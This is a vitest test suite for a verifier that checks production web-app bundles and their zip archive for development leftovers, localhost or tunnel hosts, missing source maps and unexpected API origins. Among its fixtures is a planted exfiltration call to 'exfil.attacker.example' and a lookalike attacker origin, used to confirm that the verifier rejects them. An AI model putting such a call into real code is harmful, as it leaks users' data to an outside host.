import { existsSync, readFileSync, readdirSync } from "node:fs";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import JSZip from "jszip";
import { describe, expect, test } from "vitest";
import { productionApiBase } from "./production-config.mjs";
import {
  inspectProductionEntries,
  verifyProductionArtifacts,
} from "./verify-production-bundle.mjs";

function validEntries(overrides = {}) {
  const map = JSON.stringify({
    version: 3,
    sources: ["src/main.ts"],
    sourcesContent: ["export const ready = true;"],
    names: [],
    mappings: "",
  });
  return new Map(
    Object.entries({
      "bundle.js": Buffer.from(
        `${productionApiBase};const ready=true;\n//# sourceMappingURL=bundle.js.map`,
      ),
      "bundle.js.map": Buffer.from(map),
      "index.html": Buffer.from("<main>Preflight</main>"),
      ...overrides,
    }),
  );
}

const publicDirectory = resolve(
  dirname(fileURLToPath(import.meta.url)),
  "../public",
);
const committedBundlePath = resolve(publicDirectory, "bundle.js");
// A development build carries an inline source map. Those are produced by
// `pnpm build` during local work and are not the artifact this assertion is
// about, so it only runs against a production-shaped payload.
const committedBundleIsProduction =
  existsSync(committedBundlePath) &&
  !readFileSync(committedBundlePath, "utf8").includes("sourceMappingURL=data:");

function committedPublicEntries() {
  return new Map(
    readdirSync(publicDirectory).map((name) => [
      name,
      readFileSync(resolve(publicDirectory, name)),
    ]),
  );
}

describe("production artifact verifier", () => {
  test("accepts a minified production payload with readable source", () => {
    expect(inspectProductionEntries(validEntries(), "Fixture")).toEqual([]);
  });

  test.each([
    ["development React", "https://reactjs.org/link/warning"],
    ["stub identity", "test-token"],
    ["localhost", "http://localhost:8787"],
    ["loopback host", "http://127.0.0.1:8787"],
    ["tunnel host", "https://example.trycloudflare.com"],
  ])("rejects %s in any submitted text file", (_name, signature) => {
    const problems = inspectProductionEntries(
      validEntries({ "review-source.js.map": Buffer.from(signature) }),
      "Fixture",
    );
    expect(problems.join("\n")).toContain("review-source.js.map contains");
  });

  test("rejects a bundle whose only API origin extends the production host", () => {
    const attackerBase = `${productionApiBase}.attacker.example`;
    const problems = inspectProductionEntries(
      validEntries({
        "bundle.js": Buffer.from(
          `${attackerBase};const ready=true;\n//# sourceMappingURL=bundle.js.map`,
        ),
      }),
      "Fixture",
    );
    expect(problems.join("\n")).toContain(
      `does not bind the production API origin ${productionApiBase}`,
    );
    expect(problems.join("\n")).toContain(
      `contains unexpected absolute origin ${attackerBase}`,
    );
  });

  test("rejects an extra unexpected absolute origin alongside the production one", () => {
    const problems = inspectProductionEntries(
      validEntries({
        "bundle.js": Buffer.from(
          `${productionApiBase};fetch("https://exfil.attacker.example/collect");\n//# sourceMappingURL=bundle.js.map`,
        ),
      }),
      "Fixture",
    );
    expect(problems).toEqual([
      "Fixture bundle.js contains unexpected absolute origin https://exfil.attacker.example",
    ]);
  });

  test("accepts documented inert origin literals alongside the production origin", () => {
    const problems = inspectProductionEntries(
      validEntries({
        "bundle.js": Buffer.from(
          `${productionApiBase};const ns="http://www.w3.org/2000/svg";` +
            `const err="https://reactjs.org/docs/error-decoder.html?invariant=1";` +
            `const hint="https://app-review-sandbox.webflow.io";` +
            "\n//# sourceMappingURL=bundle.js.map",
        ),
      }),
      "Fixture",
    );
    expect(problems).toEqual([]);
  });

  test.skipIf(!committedBundleIsProduction)(
    "accepts the checked-in production payload",
    () => {
      expect(
        inspectProductionEntries(committedPublicEntries(), "Public payload"),
      ).toEqual([]);
    },
  );

  test("rejects a missing or unreadable source map", () => {
    const missing = validEntries();
    missing.delete("bundle.js.map");
    expect(inspectProductionEntries(missing, "Fixture").join("\n")).toContain(
      "missing bundle.js.map",
    );

    const invalid = validEntries({ "bundle.js.map": Buffer.from("{not-json") });
    expect(inspectProductionEntries(invalid, "Fixture").join("\n")).toContain(
      "not valid JSON",
    );
  });

  test("inspects the generated archive rather than trusting the public directory", async () => {
    const temporaryRoot = await mkdtemp(
      resolve(tmpdir(), "preflight-artifact-verifier-"),
    );
    const publicDirectory = resolve(temporaryRoot, "public");
    const archivePath = resolve(temporaryRoot, "bundle.zip");
    const publicFiles = validEntries({
      "styles.css": Buffer.from("body{}"),
    });

    try {
      await mkdir(publicDirectory);
      for (const [name, contents] of publicFiles) {
        await writeFile(resolve(publicDirectory, name), contents);
      }

      const incompleteArchive = new JSZip();
      for (const [name, contents] of publicFiles) {
        if (name !== "bundle.js.map") incompleteArchive.file(name, contents);
      }
      incompleteArchive.file("webflow.json", "{}");
      await writeFile(
        archivePath,
        await incompleteArchive.generateAsync({ type: "nodebuffer" }),
      );

      await expect(
        verifyProductionArtifacts({ publicDirectory, archivePath }),
      ).rejects.toThrow("Archive is missing bundle.js.map");

      const completeArchive = new JSZip();
      for (const [name, contents] of publicFiles) {
        completeArchive.file(name, contents);
      }
      completeArchive.file("webflow.json", "{}");
      await writeFile(
        archivePath,
        await completeArchive.generateAsync({ type: "nodebuffer" }),
      );

      await expect(
        verifyProductionArtifacts({ publicDirectory, archivePath }),
      ).resolves.toMatchObject({
        archiveFiles: 5,
        publicFiles: 4,
      });
    } finally {
      await rm(temporaryRoot, { recursive: true, force: true });
    }
  });
});
